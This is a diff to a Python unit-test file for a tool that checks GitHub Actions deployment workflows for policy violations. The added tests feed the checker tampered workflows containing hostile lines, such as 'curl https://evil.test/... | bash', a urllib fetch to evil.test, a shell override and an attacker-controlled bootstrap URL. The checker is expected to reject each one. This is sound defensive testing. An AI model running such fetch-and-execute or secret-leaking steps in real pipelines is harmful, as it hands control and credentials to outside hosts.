@@ -22,11 +22,10 @@ def workflow(*, extra: str = "", dispatch: str = "workflow_dispatch:") -> bytes:
 name: protected apply
 on:
   {dispatch}
+permissions:
+  contents: read
+  id-token: write
 jobs:
-  prepare:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@{ACTION_SHA}
   apply:
     environment:
       name: {ENVIRONMENT}
@@ -37,8 +36,18 @@ jobs:
         - testai-deploy
     steps:
       - uses: actions/checkout@{ACTION_SHA}
-      - uses: ./actions/pinned-bootstrap
-      - run: ./scripts/apply.sh
+      - name: Verify signed runner bootstrap
+        env:
+          CROSS_AI_BOOTSTRAP_TOKEN: ${{{{ secrets.CROSS_AI_BOOTSTRAP_TOKEN }}}}
+          CROSS_AI_ENDPOINT_ID: ${{{{ secrets.CROSS_AI_ENDPOINT_ID }}}}
+          CROSS_AI_OPERATOR_ID: ${{{{ secrets.CROSS_AI_OPERATOR_ID }}}}
+          CROSS_AI_BOOTSTRAP_URL: https://testai.acik.com/v1/runner-bootstrap
+          CROSS_AI_BOOTSTRAP_OUTPUT: ${{{{ runner.temp }}}}/cross-ai-bootstrap.json
+        run: python3 scripts/github_apps/run_cross_ai_runner_bootstrap.py --stage apply --workflow-path .github/workflows/apply.yml --policy-file config/github-apps/cross-ai-deployment-policy.json --trust-root-file config/github-apps/cross-ai-deployment-trust-root.json --expected-trust-root-sha256 sha256:{'2' * 64} --revocations-file config/github-apps/cross-ai-deployment-revocations.json --output "$CROSS_AI_BOOTSTRAP_OUTPUT"
+      - name: Execute reviewed stage
+        uses: Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}
+        env:
+          CROSS_AI_BOOTSTRAP_FILE: ${{{{ runner.temp }}}}/cross-ai-bootstrap.json
 {extra}
 """.encode()
 
@@ -46,16 +55,30 @@ jobs:
 class WorkflowInspectionTest(unittest.TestCase):
     def assert_rejected(self, raw: bytes, code: str) -> None:
         with self.assertRaisesRegex(PolicyError, code):
-            inspect_workflow(raw, stage_policy=POLICY, environment=ENVIRONMENT)
+            inspect_workflow(
+                raw,
+                stage_policy=POLICY,
+                environment=ENVIRONMENT,
+                expected_bootstrap_url="https://testai.acik.com/v1/runner-bootstrap",
+            )
 
     def test_accepts_no_input_pinned_workflow_and_returns_digests(self) -> None:
         result = inspect_workflow(
-            workflow(), stage_policy=POLICY, environment=ENVIRONMENT
+            workflow(),
+            stage_policy=POLICY,
+            environment=ENVIRONMENT,
+            expected_bootstrap_url="https://testai.acik.com/v1/runner-bootstrap",
         )
         self.assertEqual(result.governed_job, "apply")
         self.assertEqual(result.runs_on_labels, ("self-hosted", "testai-deploy"))
-        self.assertEqual(result.local_uses, ("./actions/pinned-bootstrap",))
-        self.assertEqual(result.external_uses, (f"actions/checkout@{ACTION_SHA}",))
+        self.assertEqual(result.local_uses, ())
+        self.assertEqual(
+            result.external_uses,
+            (
+                f"Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}",
+                f"actions/checkout@{ACTION_SHA}",
+            ),
+        )
         self.assertRegex(result.workflow_sha256, r"^sha256:[a-f0-9]{64}$")
         self.assertRegex(result.dependency_lock_sha256, r"^sha256:[a-f0-9]{64}$")
 
@@ -81,6 +104,22 @@ class WorkflowInspectionTest(unittest.TestCase):
             "WORKFLOW_TRIGGER_INVALID",
         )
 
+    def test_rejects_missing_oidc_permission(self) -> None:
+        raw = workflow().replace(
+            b"permissions:\n  contents: read\n  id-token: write\n",
+            b"permissions:\n  contents: read\n",
+        )
+        self.assert_rejected(raw, "WORKFLOW_OIDC_PERMISSION_INVALID")
+
+    def test_rejects_extra_token_write_and_root_shell_override(self) -> None:
+        write_token = workflow().replace(b"contents: read", b"contents: write")
+        self.assert_rejected(write_token, "WORKFLOW_OIDC_PERMISSION_INVALID")
+        shell_override = workflow().replace(
+            b"permissions:\n",
+            b"defaults:\n  run:\n    shell: ./scripts/evil-shell {0}\npermissions:\n",
+        )
+        self.assert_rejected(shell_override, "WORKFLOW_ROOT_CONTROL_INVALID")
+
     def test_rejects_mutable_external_action_and_container(self) -> None:
         self.assert_rejected(
             workflow(extra="      - uses: owner/action@main\n"),
@@ -98,20 +137,104 @@ class WorkflowInspectionTest(unittest.TestCase):
         )
         self.assert_rejected(
             workflow(extra="      - run: curl https://evil.test/policy | bash\n"),
-            "WORKFLOW_REMOTE_CONTROL_FORBIDDEN",
+            "WORKFLOW_POST_BOOTSTRAP_INVALID",
+        )
+
+    def test_rejects_multiline_and_alternate_post_bootstrap_fetch(self) -> None:
+        self.assert_rejected(
+            workflow(
+                extra=(
+                    "      - run: |\n"
+                    "          curl \\\n"
+                    "            https://evil.test/x.sh | bash\n"
+                )
+            ),
+            "WORKFLOW_POST_BOOTSTRAP_INVALID",
+        )
+        self.assert_rejected(
+            workflow(
+                extra=(
+                    '      - run: python3 -c "import urllib.request; '
+                    "urllib.request.urlopen('https://evil.test/x')\"\n"
+                )
+            ),
+            "WORKFLOW_POST_BOOTSTRAP_INVALID",
         )
 
     def test_rejects_yaml_anchors_before_alias_expansion(self) -> None:
-        raw = workflow(extra="      - &shared\n        run: ./scripts/shared.sh\n      - *shared\n")
+        raw = workflow(
+            extra="      - &shared\n        run: ./scripts/shared.sh\n      - *shared\n"
+        )
         self.assert_rejected(raw, "WORKFLOW_YAML_ALIAS_FORBIDDEN")
 
     def test_rejects_continue_on_error_and_runner_drift(self) -> None:
         self.assert_rejected(
-            workflow(extra="      - run: ./scripts/optional.sh\n        continue-on-error: true\n"),
+            workflow(
+                extra="      - run: ./scripts/optional.sh\n        continue-on-error: true\n"
+            ),
             "WORKFLOW_CONTINUE_ON_ERROR_FORBIDDEN",
         )
         changed = workflow().replace(b"testai-deploy", b"other-runner")
         self.assert_rejected(changed, "WORKFLOW_RUNNER_MISMATCH")
+
+    def test_rejects_bootstrap_secret_in_argv_or_missing_protected_env(self) -> None:
+        argv = workflow().replace(
+            b"--workflow-path .github/workflows/apply.yml",
+            b"--workflow-path .github/workflows/apply.yml --token $CROSS_AI_BOOTSTRAP_TOKEN",
+        )
+        self.assert_rejected(argv, "WORKFLOW_BOOTSTRAP_INVALID")
+        missing = workflow().replace(
+            b"CROSS_AI_BOOTSTRAP_TOKEN: ${{ secrets.CROSS_AI_BOOTSTRAP_TOKEN }}",
+            b"CROSS_AI_BOOTSTRAP_TOKEN: unsafe-literal",
+        )
+        self.assert_rejected(missing, "WORKFLOW_BOOTSTRAP_CREDENTIAL_INVALID")
+
+    def test_rejects_bootstrap_origin_drift_and_local_post_action(self) -> None:
+        origin_drift = workflow().replace(
+            b"https://testai.acik.com/v1/runner-bootstrap",
+            b"https://attacker.invalid/v1/runner-bootstrap",
+        )
+        self.assert_rejected(origin_drift, "WORKFLOW_BOOTSTRAP_ENDPOINT_INVALID")
+        local_action = workflow().replace(
+            f"Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}".encode(),
+            b"./.github/actions/protected-apply",
+        )
+        self.assert_rejected(local_action, "WORKFLOW_POST_BOOTSTRAP_INVALID")
+
+    def test_rejects_case_or_path_variant_second_checkout(self) -> None:
+        execution_action = (
+            f"Halildeu/platform-k8s-gitops/.github/actions/protected-apply@{ACTION_SHA}"
+        ).encode()
+        for checkout in (
+            f"Actions/checkout@{ACTION_SHA}",
+            f"ACTIONS/CHECKOUT@{ACTION_SHA}",
+            f"actions/Checkout/./@{ACTION_SHA}",
+        ):
+            with self.subTest(checkout=checkout):
+                raw = workflow().replace(execution_action, checkout.encode())
+                self.assert_rejected(raw, "WORKFLOW_POST_BOOTSTRAP_INVALID")
+
+    def test_rejects_alternate_duplicate_secret_reference(self) -> None:
+        raw = workflow(extra="      - name: ${{secrets.cross_ai_bootstrap_token}}\n")
+        self.assert_rejected(raw, "WORKFLOW_BOOTSTRAP_CREDENTIAL_INVALID")
+        wrapped = workflow(
+            extra=(
+                "      - name: ${{ format('{0}', "
+                "secrets.CROSS_AI_BOOTSTRAP_TOKEN) }}\n"
+            )
+        )
+        self.assert_rejected(wrapped, "WORKFLOW_BOOTSTRAP_CREDENTIAL_INVALID")
+
+    def test_rejects_side_effect_step_before_bootstrap(self) -> None:
+        raw = workflow().replace(
+            f"      - uses: actions/checkout@{ACTION_SHA}\n      - name: Verify".encode(),
+            (
+                f"      - uses: actions/checkout@{ACTION_SHA}\n"
+                "      - run: ./scripts/pre-bootstrap.sh\n"
+                "      - name: Verify"
+            ).encode(),
+        )
+        self.assert_rejected(raw, "WORKFLOW_BOOTSTRAP_ORDER_INVALID")
 
     def test_rejects_two_governed_jobs(self) -> None:
         raw = workflow(
@@ -123,7 +246,7 @@ class WorkflowInspectionTest(unittest.TestCase):
     steps: []
 """
         )
-        self.assert_rejected(raw, "WORKFLOW_ENVIRONMENT_BINDING_INVALID")
+        self.assert_rejected(raw, "WORKFLOW_JOBS_INVALID")
 
 
 if __name__ == "__main__":
